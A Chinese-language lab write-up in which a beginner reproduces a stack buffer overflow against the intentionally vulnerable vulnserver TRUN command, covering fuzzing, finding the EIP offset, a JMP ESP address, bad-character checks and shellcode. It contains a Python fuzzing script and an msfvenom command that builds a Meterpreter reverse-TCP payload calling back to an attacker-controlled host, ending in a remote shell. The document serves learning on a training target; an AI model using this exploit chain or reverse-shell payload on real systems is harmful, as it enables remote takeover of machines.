一、原理

![](../Images/f541ce58f2acae4a29a7b5343f18ba88.png)  
缓冲区溢出的原因是程序中没有仔细检查用户输入的参数，通过往程序的缓冲区写超出其长度的内容，造成缓冲区的溢出，从而破坏程序的堆栈，造成程序崩溃或使程序转而执行其它指令，以达到攻击的目的。  
![](../Images/f541ce58f2acae4a29a7b5343f18ba88.png)

二、汇编基础

![](../Images/f541ce58f2acae4a29a7b5343f18ba88.png)  
通用寄存器：AX(累加器)BX(基址寄存器)CX(计数器)DX(数据寄存器)：可以分８位使用。指针及变址寄存器：SP(堆栈指针寄存器)BP(基址指针寄存器)SI(源变址寄存器)DI(目的变址寄存器)IP(指令指针寄存器)：用来存放下一条要执行指令在内存中代码段中的偏移地址。重点：缓冲区溢出堆栈覆盖顺序为 EIP -> ESP，通过控制EIP的指针跳转到ESP执行我们精心构造的shellcode。  
  
![](../Images/f541ce58f2acae4a29a7b5343f18ba88.png)

漏洞软件：vulnserver 已知参数TRUN调试软件：Immunity Debugger辅助脚本：noma.py、kali

```
import socketimport syshost = "192.168.1.74"port = 9999buffer = ["A"]counter=100while len(buffer) <= 30:        buffer.append("A"*counter)        counter=counter+200for string in buffer:        print "fuzzing is %s bytes" % len(string)    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)    connect=s.connect((host,port))    s.send('TRUN /.:/' + string)   s.close()
```

![](../Images/1dd88345b0cb76a632169cdc1b229e0e.png)从上图可以看到，当发送到5900个字符时程序崩溃，说明存在缓冲区溢出。  
![](../Images/7447bc7e8b3bb0c0abb8d4cebe09dc6f.png)内存中都是以十六进制显示字符，由于字符“A”对应的十六进制为41，上图可以看到，我们发送的超长字符已经成功覆盖EIP和ESP，接下来需要精确找到是第多少个字符覆盖了EIP，我们需要控制他。  
  
![](../Images/f541ce58f2acae4a29a7b5343f18ba88.png)

五、精确查找溢出点

![](../Images/f541ce58f2acae4a29a7b5343f18ba88.png)

  

由于我们之前生成的字符全部是A，不知道是第几个A覆盖了EIP，我们要生成不重复序列，精确定位EIP位置。1、msf-pattern\_create -l  5900![](../Images/c43f7f1c2b8cc3ce7b99b19e7076627a.png)复制这些字符替换我们前面脚本中的A2、继续动态调试成功溢出，记下EIP地址：![](../Images/7ad9ccfa23b20e2409fe0d08fe64b7cc.png)3、查找EIP偏移量msf-pattern\_offset -l 5900 -q 386f4337![](../Images/bfe6854ec2f49815812877aa61c488c1.png)显示结果为2003，说明覆盖EIP地址的是第2003个字符后面的字符，接下来就可以控制EIP的地址，需要让他跳转到我们的shellcode。

![](../Images/f541ce58f2acae4a29a7b5343f18ba88.png)

六、控制EIP

![](../Images/f541ce58f2acae4a29a7b5343f18ba88.png)

  

1、获取JMP ESP汇编指令在内存中的十六进制数据，FFE4：![](../Images/fc27476346a3a254a8eb51b310fb0dba.png)2、寻找系统中的偏移地址，我们需要让EIP执行JMP ESP，从而跳转到ESP执行我们ESP中shellcode。3、查找vulnserver调用的系统文件，我们要找前四列都为false的模块，因为没有启用内存保护机制，每次为程序分配固定的内存地址，这样计算机重启不会导致溢出程序失效。![](../Images/3f03dfc250af2fcccddcf835a74de2c3.png)4、在模块中查找 jmp esp对应的偏移地址：![](../Images/becebc877c7b847924ff797eba412ba4.png)跳转指令对应的偏移地址为625011af，我们来验证一下：![](../Images/7e535d0fba1c34ab1c54284e9574581d.png)修改py脚本，将2003后面的字节写成这个偏移地址，由于栈先进后出的原则，我们要反过来写，“\\xaf\\x11\\x50\\x62”，验证，需要设置断点。![](../Images/dee5163f1a87126c1d3f662a4899f01b.png)EIP成功指向跳转esp的偏移地址，接下来就可以在ESP构造shellcode，让EIP指向esp，shellcode就可以执行啦。

七、生成shellcode

![](../Images/f541ce58f2acae4a29a7b5343f18ba88.png)

  

1、坏字节对shellcode的影响，有些字节在缓冲区中是无法使用的，我们需要找出来，将所有字节发送到缓冲区，查看哪些字节不正常。脚本：![](../Images/edad747d25e4f9bd602aad860f4daef7.png)打开动态调试观察内存中数据分布：![](../Images/8e9d7505c215bca844f680934d26056a.png)\\x01\\xff都正常，注意\\x00是默认的坏字符，有可能终止shellcode执行，我们需要去除他。接下来生成shellcode：msfvenom -p windows/meterpreter/reverse\_tcp LHOST=192.168.1.82 LPORT=4444 -a x86 --platform windows -f c -b "\\x00"\-- a 指定CPU架构\-- platform 指定操作系统平台![](../Images/503a0f51ec527138deb54a15ffc14097.png)将shellcode替换之前脚本中badchars启动msf![](../Images/db1df1fc7e3ab634f6b58ed716b5c9c4.png)运行py脚本陈宫返回msf shell![](../Images/a2ee6826d708087f2ed9cbf93447f32a.png)到此为止，缓冲区溢出完成。小白第一次复现成功有一点点成就感，跟大家分享下，我相信只要你静下心慢慢搞，也能做成功，大佬请无视。
